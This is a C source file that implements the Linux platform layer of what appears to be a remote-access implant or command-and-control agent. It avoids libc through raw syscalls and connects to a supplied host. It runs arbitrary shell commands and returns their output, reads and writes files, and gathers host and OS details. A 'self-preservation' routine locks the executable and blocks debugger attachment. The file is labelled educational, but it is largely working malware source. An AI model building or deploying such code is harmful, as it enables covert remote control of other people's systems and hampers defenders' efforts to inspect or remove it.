/* ==========================================================================
 * pal_linux.c — Platform Abstraction Layer (Linux/POSIX) — SYSCALL EDITION
 * ==========================================================================
 * Pure raw-syscall implementation of the PAL interface defined in pal.h.
 * Every system interaction goes through the inline syscall wrappers in
 * syscall_linux.h.  NO libc functions are called:
 *
 *   - No stdio    (printf, fprintf, fopen, fread, fwrite, popen, pclose)
 *   - No stdlib   (malloc, free, exit, getenv, rand, srand, strtol)
 *   - No string.h (memset, memcpy, strlen, strcmp, strncpy, strcat)
 *   - No unistd.h (read, write, close, fork, execve, pipe, dup2, ...)
 *   - No socket.h (socket, connect, send, recv)
 *   - No time.h   (time, nanosleep)
 *   - No arpa/inet(inet_pton, htons)
 *
 * All replaced by:
 *   - syscall_linux.h  : sc_read, sc_write, sc_socket, sc_mmap, ...
 *   - nolibc.h         : _nc_memset, _nc_memcpy, _nc_strlen, _nc_snprintf, ...
 *   - sc_malloc/sc_free: mmap-based allocator from syscall_linux.h
 *
 * ACADEMIC/EDUCATIONAL USE ONLY.
 * ========================================================================== */

#include "pal.h"
#include "config.h"
#include "syscall_linux.h"
#include "nolibc.h"

/* ---- Platform initialisation ------------------------------------------ */

int pal_init(void)
{
    /* No special initialisation needed.
     * In a fully standalone build (no libc), we would set up a heap
     * here if needed.  Our mmap-based allocator is stateless. */
    return 0;
}

void pal_cleanup(void)
{
    /* Nothing to clean up. */
}

/* ---- Sockets ---------------------------------------------------------- */

int pal_socket_create(void)
{
    int sock = sc_socket(SC_AF_INET, SC_SOCK_STREAM, 0);
    if (sock < 0) {
        pal_log("socket create failed (%d)", sock);
        return -1;
    }
    return sock;
}

int pal_socket_connect(int sock, const char *host, uint16_t port)
{
    struct sc_sockaddr_in addr;
    _nc_memset(&addr, 0, sizeof(addr));

    addr.sin_family = SC_AF_INET;
    addr.sin_port   = _nc_htons(port);

    if (_nc_inet_pton4(host, &addr.sin_addr) != 0) {
        pal_log("invalid address: %s", host);
        return -1;
    }

    int rc = sc_connect(sock, &addr, sizeof(addr));
    if (rc < 0) {
        pal_log("connect failed (%d)", rc);
        return -1;
    }

    return 0;
}

int pal_socket_send(int sock, const void *buf, size_t len)
{
    const uint8_t *ptr = (const uint8_t *)buf;
    size_t remaining = len;

    while (remaining > 0) {
        long sent = sc_sendto(sock, ptr, remaining, 0, NULL, 0);
        if (sent <= 0) {
            pal_log("send failed (%ld)", sent);
            return -1;
        }
        ptr       += (size_t)sent;
        remaining -= (size_t)sent;
    }

    return 0;
}

int pal_socket_recv(int sock, void *buf, size_t len)
{
    uint8_t *ptr = (uint8_t *)buf;
    size_t remaining = len;

    while (remaining > 0) {
        long received = sc_recvfrom(sock, ptr, remaining, 0, NULL, NULL);
        if (received <= 0) {
            if (received == 0) {
                pal_log("connection closed by peer");
            } else {
                pal_log("recv failed (%ld)", received);
            }
            return -1;
        }
        ptr       += (size_t)received;
        remaining -= (size_t)received;
    }

    return 0;
}

void pal_socket_close(int sock)
{
    if (sock >= 0) {
        sc_close(sock);
    }
}

/* ---- Process execution ------------------------------------------------ */

int pal_spawn_process(const char *cmd, char *out_buf, size_t out_size,
                      int *exit_code)
{
    if (cmd == NULL || out_buf == NULL || exit_code == NULL) {
        return -1;
    }

    /* Create a pipe for capturing stdout/stderr */
    int pipefd[2];
    if (sc_pipe2(pipefd, 0) < 0) {
        pal_log("pipe2 failed");
        *exit_code = -1;
        return -1;
    }

    int pid = sc_fork();
    if (pid < 0) {
        pal_log("fork failed (%d)", pid);
        sc_close(pipefd[0]);
        sc_close(pipefd[1]);
        *exit_code = -1;
        return -1;
    }

    if (pid == 0) {
        /* ---- Child process ---- */

        /* Close read end of pipe */
        sc_close(pipefd[0]);

        /* Redirect stdout and stderr to write end of pipe */
        sc_dup2(pipefd[1], 1);  /* stdout */
        sc_dup2(pipefd[1], 2);  /* stderr */
        sc_close(pipefd[1]);

        /* Execute the command via /bin/sh -c */
        char *const argv[] = {
            (char *)"/bin/sh",
            (char *)"-c",
            (char *)cmd,
            NULL
        };
        char *const envp[] = { NULL };

        sc_execve("/bin/sh", argv, envp);

        /* If execve returns, it failed */
        sc_exit_group(127);
    }

    /* ---- Parent process ---- */

    /* Close write end of pipe */
    sc_close(pipefd[1]);

    /* Read child output from the pipe */
    size_t total = 0;
    while (total < out_size - 1) {
        long n = sc_read(pipefd[0], out_buf + total, out_size - 1 - total);
        if (n <= 0) {
            break;
        }
        total += (size_t)n;
    }
    out_buf[total] = '\0';

    sc_close(pipefd[0]);

    /* Wait for child to exit */
    int status = 0;
    sc_wait4(pid, &status, 0, NULL);

    /* Extract exit code: WIFEXITED / WEXITSTATUS equivalent.
     * On Linux, status layout:
     *   bits 15..8 = exit code (if exited normally)
     *   bits  7..0 = signal (0 if exited normally) */
    if ((status & 0x7F) == 0) {
        /* Normal exit */
        *exit_code = (status >> 8) & 0xFF;
    } else {
        *exit_code = -1;
    }

    return 0;
}

/* ---- File I/O --------------------------------------------------------- */

int pal_read_file(const char *path, uint8_t **buf, size_t *size)
{
    if (path == NULL || buf == NULL || size == NULL) {
        return -1;
    }

    int fd = sc_openat(SC_AT_FDCWD, path, SC_O_RDONLY, 0);
    if (fd < 0) {
        pal_log("open failed: %s (%d)", path, fd);
        return -1;
    }

    /* Determine file size via lseek */
    long file_size = sc_lseek(fd, 0, SC_SEEK_END);
    if (file_size < 0) {
        pal_log("lseek failed (%ld)", file_size);
        sc_close(fd);
        return -1;
    }
    sc_lseek(fd, 0, SC_SEEK_SET);

    if ((size_t)file_size > MAX_FILE_SIZE) {
        pal_log("file too large: %ld bytes (max %d)", file_size, MAX_FILE_SIZE);
        sc_close(fd);
        return -1;
    }

    *buf = (uint8_t *)sc_malloc((size_t)file_size);
    if (*buf == NULL) {
        sc_close(fd);
        return -1;
    }

    /* Read the entire file */
    size_t total = 0;
    while (total < (size_t)file_size) {
        long n = sc_read(fd, *buf + total, (size_t)file_size - total);
        if (n <= 0) {
            break;
        }
        total += (size_t)n;
    }
    sc_close(fd);

    if (total != (size_t)file_size) {
        sc_free(*buf);
        *buf = NULL;
        return -1;
    }

    *size = (size_t)file_size;
    return 0;
}

int pal_write_file(const char *path, const uint8_t *buf, size_t size)
{
    if (path == NULL || (buf == NULL && size > 0)) {
        return -1;
    }

    int fd = sc_openat(SC_AT_FDCWD, path,
                       SC_O_WRONLY | SC_O_CREAT | SC_O_TRUNC,
                       SC_MODE_0644);
    if (fd < 0) {
        pal_log("open for write failed: %s (%d)", path, fd);
        return -1;
    }

    if (size > 0) {
        size_t total = 0;
        while (total < size) {
            long n = sc_write(fd, buf + total, size - total);
            if (n <= 0) {
                pal_log("write failed (%ld)", n);
                sc_close(fd);
                return -1;
            }
            total += (size_t)n;
        }
    }

    sc_close(fd);
    return 0;
}

/* ---- Time ------------------------------------------------------------- */

int64_t pal_time_unix(void)
{
    struct sc_timespec ts;
    if (sc_clock_gettime(SC_CLOCK_REALTIME, &ts) < 0) {
        return 0;
    }
    return (int64_t)ts.tv_sec;
}

void pal_sleep_ms(uint32_t ms)
{
    struct sc_timespec ts;
    ts.tv_sec  = ms / 1000;
    ts.tv_nsec = (long)(ms % 1000) * 1000000L;
    sc_nanosleep(&ts, NULL);
}

/* ---- Process control -------------------------------------------------- */

void pal_exit(int code)
{
    sc_exit_group(code);
}

/* ---- System information ----------------------------------------------- */

int pal_get_hostname(char *buf, size_t size)
{
    if (buf == NULL || size == 0) {
        return -1;
    }

    struct sc_utsname uts;
    if (sc_uname(&uts) < 0) {
        _nc_strncpy(buf, "unknown", size - 1);
        buf[size - 1] = '\0';
        return -1;
    }

    _nc_strncpy(buf, uts.nodename, size - 1);
    buf[size - 1] = '\0';
    return 0;
}

int pal_get_os_info(char *buf, size_t size)
{
    if (buf == NULL || size == 0) {
        return -1;
    }

    /* Read /proc/version for a descriptive OS string. */
    int fd = sc_openat(SC_AT_FDCWD, "/proc/version", SC_O_RDONLY, 0);
    if (fd >= 0) {
        long n = sc_read(fd, buf, size - 1);
        sc_close(fd);
        if (n > 0) {
            buf[n] = '\0';
            /* Strip trailing newline */
            size_t len = _nc_strlen(buf);
            if (len > 0 && buf[len - 1] == '\n') {
                buf[len - 1] = '\0';
            }
            return 0;
        }
    }

    /* Fallback: use uname */
    struct sc_utsname uts;
    if (sc_uname(&uts) == 0) {
        _nc_snprintf(buf, size, "%s %s %s",
                     uts.sysname, uts.release, uts.machine);
        return 0;
    }

    _nc_strncpy(buf, "linux", size - 1);
    buf[size - 1] = '\0';
    return 0;
}

int pal_get_arch(char *buf, size_t size)
{
    if (buf == NULL || size == 0) {
        return -1;
    }

    /* Use compile-time architecture macros. */
#if defined(__x86_64__) || defined(_M_X64)
    _nc_strncpy(buf, "x86_64", size - 1);
#elif defined(__i386__) || defined(_M_IX86)
    _nc_strncpy(buf, "i386", size - 1);
#elif defined(__aarch64__)
    _nc_strncpy(buf, "aarch64", size - 1);
#elif defined(__arm__)
    _nc_strncpy(buf, "armv7", size - 1);
#else
    _nc_strncpy(buf, "unknown", size - 1);
#endif
    buf[size - 1] = '\0';

    return 0;
}

/* ---- Logging ---------------------------------------------------------- */

void pal_log(const char *fmt, ...)
{
    /* Format the message into a stack buffer using our nolibc formatter,
     * then write it to stderr (fd 2) via raw syscall. */

    char prefix[] = "[agent] ";
    char suffix[] = "\n";
    char msgbuf[1024];

    __builtin_va_list ap;
    __builtin_va_start(ap, fmt);

    /* We need a va_list-compatible snprintf.  Since _nc_snprintf uses
     * __builtin_va_list internally, we reconstruct the call manually
     * by parsing the format string ourselves. */

    /* Simple approach: format into msgbuf using _nc_snprintf.
     * But _nc_snprintf is variadic, not va_list.  So we do a simpler
     * direct format here for the logging path. */
    size_t pos = 0;
    while (*fmt && pos < sizeof(msgbuf) - 1) {
        if (*fmt != '%') {
            msgbuf[pos++] = *fmt++;
            continue;
        }
        fmt++; /* skip '%' */

        int is_long = 0;
        if (*fmt == 'l') {
            is_long = 1;
            fmt++;
            if (*fmt == 'l') {
                fmt++; /* skip 'll' — treat same as 'l' */
            }
        }

        char numbuf[24];
        switch (*fmt) {
        case 's': {
            const char *s = __builtin_va_arg(ap, const char *);
            if (s == NULL) s = "(null)";
            while (*s && pos < sizeof(msgbuf) - 1) {
                msgbuf[pos++] = *s++;
            }
            break;
        }
        case 'd': {
            long v;
            if (is_long) v = __builtin_va_arg(ap, long);
            else v = (long)__builtin_va_arg(ap, int);
            char *p = _nc_i64_to_dec((int64_t)v, numbuf, sizeof(numbuf));
            while (*p && pos < sizeof(msgbuf) - 1) {
                msgbuf[pos++] = *p++;
            }
            break;
        }
        case 'u': {
            unsigned long v;
            if (is_long) v = __builtin_va_arg(ap, unsigned long);
            else v = (unsigned long)__builtin_va_arg(ap, unsigned int);
            char *p = _nc_u64_to_dec((uint64_t)v, numbuf, sizeof(numbuf));
            while (*p && pos < sizeof(msgbuf) - 1) {
                msgbuf[pos++] = *p++;
            }
            break;
        }
        case 'x': {
            unsigned long v;
            if (is_long) v = __builtin_va_arg(ap, unsigned long);
            else v = (unsigned long)__builtin_va_arg(ap, unsigned int);
            char *p = _nc_u32_to_hex((uint32_t)v, numbuf, sizeof(numbuf));
            while (*p && pos < sizeof(msgbuf) - 1) {
                msgbuf[pos++] = *p++;
            }
            break;
        }
        case 'p': {
            void *ptr = __builtin_va_arg(ap, void *);
            msgbuf[pos++] = '0';
            if (pos < sizeof(msgbuf) - 1) msgbuf[pos++] = 'x';
            char *p = _nc_u32_to_hex((uint32_t)(uintptr_t)ptr,
                                     numbuf, sizeof(numbuf));
            while (*p && pos < sizeof(msgbuf) - 1) {
                msgbuf[pos++] = *p++;
            }
            break;
        }
        case '%':
            msgbuf[pos++] = '%';
            break;
        default:
            msgbuf[pos++] = '%';
            if (pos < sizeof(msgbuf) - 1) msgbuf[pos++] = *fmt;
            break;
        }
        fmt++;
    }
    msgbuf[pos] = '\0';

    __builtin_va_end(ap);

    /* Write to stderr (fd 2) */
    sc_write(2, prefix, sizeof(prefix) - 1);
    sc_write(2, msgbuf, pos);
    sc_write(2, suffix, sizeof(suffix) - 1);
}

/* ---- Kill switch ------------------------------------------------------ */

int pal_check_sentinel(const char *path)
{
    if (path == NULL) {
        return 0;
    }

    /* Use newfstatat to check if the file exists.
     * We use openat + close as a simpler existence check. */
    int fd = sc_openat(SC_AT_FDCWD, path, SC_O_RDONLY, 0);
    if (fd >= 0) {
        sc_close(fd);
        return 1; /* File exists */
    }
    return 0; /* File does not exist */
}

/* ---- Self-preservation (raw syscall) ---------------------------------- */

/*
 * All operations below use the raw syscall wrappers from syscall_linux.h.
 * No libc wrapper functions are used.
 *
 * File protection strategy:
 *   1. readlinkat  — resolve /proc/self/exe to the real path
 *   2. openat      — hold an O_RDONLY fd to keep the inode alive
 *   3. flock       — place an exclusive advisory lock
 *
 * Process protection strategy:
 *   1. prctl(PR_SET_DUMPABLE, 0) — blocks ptrace attach
 */

/* File descriptor held open on the agent executable */
static int g_sp_exe_fd = -1;

int pal_self_preserve_start(void)
{
    if (g_sp_exe_fd >= 0) {
        return 0; /* Already active */
    }

    /* 1. Resolve our executable path via readlinkat(2).
     *    /proc/self/exe is a symlink to the executable file. */
    char exe_path[4096];
    long rc = sc_readlinkat(SC_AT_FDCWD, "/proc/self/exe",
                            exe_path, sizeof(exe_path) - 1);
    if (rc <= 0) {
        pal_log("self-preserve: readlinkat failed (%ld)", rc);
        return -1;
    }
    exe_path[rc] = '\0';

    /* 2. Open the executable read-only via openat(2).
     *    Holding this fd keeps the inode reference alive even if
     *    the directory entry is unlinked — the kernel will not free
     *    the inode while an open fd exists. */
    g_sp_exe_fd = sc_openat(SC_AT_FDCWD, exe_path, SC_O_RDONLY, 0);
    if (g_sp_exe_fd < 0) {
        pal_log("self-preserve: openat failed (%d)", g_sp_exe_fd);
        return -1;
    }

    /* 3. Place an exclusive advisory flock via flock(2).
     *    This signals to cooperating processes (package managers,
     *    cleanup scripts, etc.) that the file is in active use.
     *    We use LOCK_NB so we never block on a competing lock. */
    int lock_rc = sc_flock(g_sp_exe_fd, SC_LOCK_EX | SC_LOCK_NB);
    if (lock_rc < 0) {
        pal_log("self-preserve: flock LOCK_EX warning (non-fatal)");
        /* Non-fatal: the open fd still provides inode protection. */
    }

    /* 4. Clear the dumpable flag via prctl(2).
     *    A non-dumpable process cannot be attached to by ptrace,
     *    which blocks most userspace debuggers and SIGKILL-via-inject
     *    techniques from non-root processes. */
    sc_prctl(SC_PR_SET_DUMPABLE, 0, 0, 0, 0);

    pal_log("Self-preservation ENABLED (fd=%d, path=%s)",
            g_sp_exe_fd, exe_path);
    return 0;
}

int pal_self_preserve_stop(void)
{
    /* Restore the dumpable flag so the process can be debugged normally. */
    sc_prctl(SC_PR_SET_DUMPABLE, 1, 0, 0, 0);

    if (g_sp_exe_fd >= 0) {
        /* Release the advisory lock. */
        sc_flock(g_sp_exe_fd, SC_LOCK_UN);

        /* Close the file descriptor — releases the inode reference. */
        sc_close(g_sp_exe_fd);
        g_sp_exe_fd = -1;
    }

    pal_log("Self-preservation DISABLED.");
    return 0;
}

int pal_get_exe_path(char *buf, size_t size)
{
    if (buf == NULL || size == 0) {
        return -1;
    }

    long rc = sc_readlinkat(SC_AT_FDCWD, "/proc/self/exe",
                            buf, size - 1);
    if (rc <= 0) {
        return -1;
    }
    buf[rc] = '\0';
    return 0;
}
